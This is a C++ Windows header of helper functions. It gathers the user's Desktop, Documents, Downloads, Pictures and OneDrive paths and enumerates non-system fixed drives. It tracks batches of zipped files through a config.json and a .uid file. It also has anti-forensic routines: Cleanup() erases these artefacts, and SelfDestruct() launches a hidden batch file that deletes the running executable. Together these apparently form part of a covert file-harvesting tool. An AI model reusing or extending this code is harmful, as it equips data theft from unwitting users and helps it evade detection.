#pragma once
#include <filesystem>
#include <Windows.h>
#include <fstream>
#include <ShlObj.h>
#include "json.hpp"


std::string TmpPath() {
    char buffer[MAX_PATH];
    DWORD length = GetTempPathA(MAX_PATH, buffer);
    if (length == 0 || length >= MAX_PATH) {
        std::cerr << "Failed to get temp path\n";
        return "";
    }
    return std::string(buffer);
}


size_t GetTotalFileSize(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    return file.tellg();
}


std::string GetCWD() {
    char buffer[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, buffer) != 0) { // Notice the 'A' at the end of GetCurrentDirectoryA
        return std::string(buffer) + "\\";
    }
    return "";
}


void Cleanup() {
    // Define the config file name
    const std::string configFileName = "config.json";

    // Check if config.json exists and if so, read and delete the files listed
    if (std::filesystem::exists(configFileName)) {
        std::ifstream configFile(configFileName);
        nlohmann::json configData;
        configFile >> configData;

        // Explicitly close the configFile
        configFile.close();

        for (const auto& entry : configData) {
            std::string filename = entry["filename"];
            if (std::filesystem::exists(filename)) {
                std::filesystem::remove(filename);
            }
        }

        // Delete the config.json file itself
        std::filesystem::remove(configFileName);
    }

    // Check for zipped.zip and delete it
    if (std::filesystem::exists("zipped.zip")) {
        std::filesystem::remove("zipped.zip");
    }

    // Check if .uid exist and delete it
    if (std::filesystem::exists(".uid")) {
        std::filesystem::remove(".uid");
    }

}


void SelfDestruct() {
    // Get the full path of the current executable
    char executablePath[MAX_PATH];
    GetModuleFileNameA(NULL, executablePath, MAX_PATH);

    // Create a temporary batch file
    std::ofstream batchFile("delete.bat");
    if (!batchFile) {
        //std::cerr << "Could not create batch file.\n";
        return;
    }

    // Write commands to the batch file to delete the executable and then the batch file itself
    batchFile << "@echo off\n";
    // wait for 10 seconds for the application to exit
    batchFile << "timeout /T 4\n";
    batchFile << ":retry\n";
    // delete the current executable
    batchFile << "del \"" << executablePath << "\"\n";
    batchFile << "if exist \"" << executablePath << "\" goto retry\n";
    // Delete the batch file itself
    batchFile << "del \"%~f0\"\n";
    batchFile.close();

    // Start the batch file hidden using ShellExecute
    ShellExecuteA(NULL, "open", "delete.bat", NULL, NULL, SW_HIDE);

    // Exit the program
    exit(0);
}


// === Functions responsible for retrieving special folders BEGIN ===
std::wstring GetFolderPath(const KNOWNFOLDERID& folderId) {
    wchar_t* pathRaw = nullptr;
    if (SHGetKnownFolderPath(folderId, 0, nullptr, &pathRaw) == S_OK) {
        std::wstring path(pathRaw);
        CoTaskMemFree(pathRaw);
        return path;
    }
    else {
        return L"";
    }
}


std::vector<std::wstring> GetSpecialPaths() {
    std::vector<std::wstring> paths;

    paths.push_back(GetFolderPath(FOLDERID_Desktop));
    paths.push_back(GetFolderPath(FOLDERID_Documents));
    paths.push_back(GetFolderPath(FOLDERID_Downloads));
    paths.push_back(GetFolderPath(FOLDERID_Pictures));
    paths.push_back(GetFolderPath(FOLDERID_SkyDrive));

    return paths;
}
// === END ===



inline std::string WStringToString(const std::wstring& wstr)
{
    if (wstr.empty())
        return std::string();

    int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), static_cast<int>(wstr.size()), NULL, 0, NULL, NULL);
    std::string wsTS(sizeNeeded, 0);
    if (!WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), static_cast<int>(wstr.size()), &wsTS[0], sizeNeeded, NULL, NULL)) {
        // Handle error, for this example, return an empty string
        return std::string();
    }
    return wsTS;
}


inline std::wstring StringToWString(const std::string& str)
{
    if (str.empty())
        return std::wstring();

    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), NULL, 0);
    std::wstring sTW(sizeNeeded, 0);
    if (!MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), &sTW[0], sizeNeeded)) {
        // Handle error, for this example, return an empty wstring
        return std::wstring();
    }
    return sTW;
}



void SaveOutput(const std::wstring& filePath, const std::vector<std::wstring>& files) {
    std::wofstream outFile(filePath, std::ios_base::app);
    if (outFile.is_open()) {
        for (const auto& file : files) {
            outFile << file << std::endl;
        }
    }
}


void SaveJSON(const std::string& filePath, const nlohmann::json& jsonData) {
    std::ofstream file(filePath);
    if (file.is_open()) {
        file << jsonData.dump(4); // Indented with 4 spaces for readability
        file.close();
        std::cout << "JSON saved to " << filePath << std::endl;
    }
    else {
        std::cerr << "Failed to open file " << filePath << " for writing" << std::endl;
    }
}


// === Functions responsible for saving JSON config for keep tracking of batches BEGIN ===
void add_batch(const std::string& filename, const std::string configFile) {
    nlohmann::json batches;
    std::ifstream input(configFile);

    // Read existing batches if the file exists
    if (input.good()) {
        input >> batches;
        input.close();
    }

    // Append new batch to the list
    batches.push_back({
        {"id", static_cast<int>(batches.size()) + 1},
        {"filename", filename}
        });

    std::ofstream output(configFile);
    output << batches.dump(4);  // 4 spaces for indentation
    output.close();
}
// === END ===


std::wstring GetUIDFromFile() {
    std::wstring uid;
    const int MAX_RETRIES = 10;
    int attempt = 0;

    // Get the temporary directory path and append the .uid filename
    std::string tmpDir = TmpPath();
    const std::wstring fullpath = std::wstring(tmpDir.begin(), tmpDir.end()) + L".uid";

    while (attempt < MAX_RETRIES) {
        std::wifstream infile(fullpath);

        if (infile.is_open()) {
            std::getline(infile, uid);
            infile.close();
            return uid;
        }
        else {
            std::cerr << "Failed to open .uid file. Attempt: " << (attempt + 1) << std::endl;
            Sleep(500);  // Wait for 500 milliseconds
        }

        attempt++;
    }

    return L"";
}



bool CheckPerms(const std::wstring& path, DWORD accessRights)
{
    if (path.empty()) return false;

    HANDLE hFile = CreateFile(path.c_str(), accessRights, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DWORD error = GetLastError();
        if (error == ERROR_ACCESS_DENIED)
        {
            CloseHandle(hFile);
            return false;
        }
    }

    CloseHandle(hFile);
    return true;
}


std::vector<std::wstring> Disk_ID()
{
    std::vector<std::wstring> drives;

    DWORD dwSize = MAX_PATH;
    wchar_t szLogicalDrives[MAX_PATH] = { 0 };
    DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);

    if (dwResult > 0 && dwResult <= MAX_PATH)
    {
        wchar_t* szSingleDrive = szLogicalDrives;
        while (*szSingleDrive)
        {
            UINT driveType = GetDriveType(szSingleDrive);

            if (driveType == DRIVE_FIXED && CheckPerms(szSingleDrive, GENERIC_READ))
            {
                // Check if it's not the C: drive
                if (wcscmp(szSingleDrive, L"C:\\") != 0)
                {
                    drives.push_back(szSingleDrive);
                }
            }
            // Get the next drive
            szSingleDrive += wcslen(szSingleDrive) + 1;
        }
    }
    return drives;
}






